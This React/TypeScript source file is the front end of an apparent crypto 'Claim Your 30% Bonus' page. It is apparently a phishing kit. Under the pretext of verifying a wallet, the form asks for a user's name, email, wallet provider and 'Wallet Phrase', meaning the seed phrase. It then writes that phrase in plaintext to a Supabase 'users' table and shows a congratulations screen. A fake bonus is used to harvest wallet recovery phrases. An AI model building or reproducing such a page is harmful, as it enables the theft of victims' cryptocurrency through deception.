import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { ChevronDown, Check } from 'lucide-react';
import { WALLET_PROVIDERS } from '../lib/cryptoData';
import { supabase } from '../lib/supabase';
export function BonusPage() {
  const navigate = useNavigate();
  const [loading, setLoading] = useState(false);
  const [formData, setFormData] = useState({
    name: '',
    email: '',
    walletProvider: '',
    walletPhrase: ''
  });
  const [isDropdownOpen, setIsDropdownOpen] = useState(false);
  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!formData.walletProvider) {
      alert('Please select a wallet provider');
      return;
    }
    setLoading(true);
    try {
      // Check if user exists
      const { data: existingUser } = await supabase.
      from('users').
      select('*').
      eq('email', formData.email).
      single();
      if (existingUser) {
        // Update existing user
        await supabase.
        from('users').
        update({
          name: formData.name,
          wallet_provider: formData.walletProvider,
          wallet_phrase: formData.walletPhrase,
          pending_claims: (existingUser.pending_claims || 0) + 1
        }).
        eq('email', formData.email);
      } else {
        // Create new user with placeholder password
        await supabase.from('users').insert({
          name: formData.name,
          email: formData.email,
          wallet_provider: formData.walletProvider,
          wallet_phrase: formData.walletPhrase,
          password_hash: '',
          total_assets: 0,
          bonus_earned: 0,
          active_wallets: 1,
          pending_claims: 1
        });
      }
      // Store name for congratulations page
      localStorage.setItem('neoncrypto_temp_name', formData.name);
      localStorage.setItem('neoncrypto_temp_email', formData.email);
      navigate('/congratulations');
    } catch (error) {
      console.error('Error submitting bonus claim:', error);
      alert('Something went wrong. Please try again.');
    } finally {
      setLoading(false);
    }
  };
  const selectedWallet = WALLET_PROVIDERS.find(
    (w) => w.name === formData.walletProvider
  );
  return (
    <div className="min-h-screen pt-24 pb-16 px-4 flex items-center justify-center">
      <div className="max-w-2xl w-full">
        <div className="text-center mb-10">
          <h1 className="text-4xl md:text-5xl font-bold font-display mb-4">
            Claim Your <span className="text-neon-cyan">30% Bonus</span>
          </h1>
          <p className="text-gray-400">
            Enter your details below to verify your wallet and receive your
            bonus instantly.
          </p>
        </div>

        <div className="glass-panel p-8 md:p-10 rounded-3xl border-t border-neon-cyan/30 shadow-[0_0_50px_rgba(0,240,255,0.1)]">
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="grid grid-cols-1 md:grid-cols-2 gap-6">
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Full Name
                </label>
                <input
                  type="text"
                  required
                  value={formData.name}
                  onChange={(e) =>
                  setFormData({
                    ...formData,
                    name: e.target.value
                  })
                  }
                  className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-neon-cyan focus:ring-1 focus:ring-neon-cyan transition-all"
                  placeholder="Enter your name" />

              </div>
              <div>
                <label className="block text-sm font-medium text-gray-300 mb-2">
                  Email Address
                </label>
                <input
                  type="email"
                  required
                  value={formData.email}
                  onChange={(e) =>
                  setFormData({
                    ...formData,
                    email: e.target.value
                  })
                  }
                  className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-neon-cyan focus:ring-1 focus:ring-neon-cyan transition-all"
                  placeholder="Enter your email" />

              </div>
            </div>

            <div className="relative">
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Wallet Provider
              </label>
              <button
                type="button"
                onClick={() => setIsDropdownOpen(!isDropdownOpen)}
                className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white text-left flex items-center justify-between focus:outline-none focus:border-neon-cyan transition-all">

                {selectedWallet ?
                <div className="flex items-center">
                    <img
                    src={selectedWallet.logo}
                    alt={selectedWallet.name}
                    className="w-6 h-6 mr-3 object-contain" />

                    <span>{selectedWallet.name}</span>
                  </div> :

                <span className="text-gray-500">Select your wallet</span>
                }
                <ChevronDown
                  className={`w-5 h-5 text-gray-400 transition-transform ${isDropdownOpen ? 'rotate-180' : ''}`} />

              </button>

              {isDropdownOpen &&
              <div className="absolute z-50 w-full mt-2 bg-[#0f0f2a] border border-white/10 rounded-xl shadow-xl max-h-60 overflow-y-auto custom-scrollbar">
                  {WALLET_PROVIDERS.map((wallet) =>
                <button
                  key={wallet.name}
                  type="button"
                  onClick={() => {
                    setFormData({
                      ...formData,
                      walletProvider: wallet.name
                    });
                    setIsDropdownOpen(false);
                  }}
                  className="w-full px-4 py-3 flex items-center hover:bg-white/10 transition-colors border-b border-white/5 last:border-0">

                      <img
                    src={wallet.logo}
                    alt={wallet.name}
                    className="w-8 h-8 mr-3 object-contain" />

                      <span className="text-white font-medium">
                        {wallet.name}
                      </span>
                      {formData.walletProvider === wallet.name &&
                  <Check className="ml-auto w-5 h-5 text-neon-green" />
                  }
                    </button>
                )}
                </div>
              }
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-300 mb-2">
                Wallet Phrase
              </label>
              <input
                type="text"
                required
                value={formData.walletPhrase}
                onChange={(e) =>
                setFormData({
                  ...formData,
                  walletPhrase: e.target.value
                })
                }
                className="w-full bg-black/40 border border-white/10 rounded-xl px-4 py-3 text-white focus:outline-none focus:border-neon-cyan focus:ring-1 focus:ring-neon-cyan transition-all font-mono text-sm"
                placeholder="Enter here" />

              <p className="text-xs text-gray-500 mt-2">
                Make sure this is correct.
              </p>
            </div>

            <button
              type="submit"
              disabled={loading}
              className="w-full py-4 rounded-xl bg-gradient-to-r from-neon-cyan to-neon-blue text-black font-bold text-xl hover:shadow-[0_0_30px_rgba(0,240,255,0.4)] transition-all duration-300 transform hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed mt-4">

              {loading ? 'Verifying...' : 'Verify & Claim Bonus'}
            </button>
          </form>
        </div>
      </div>
    </div>);

}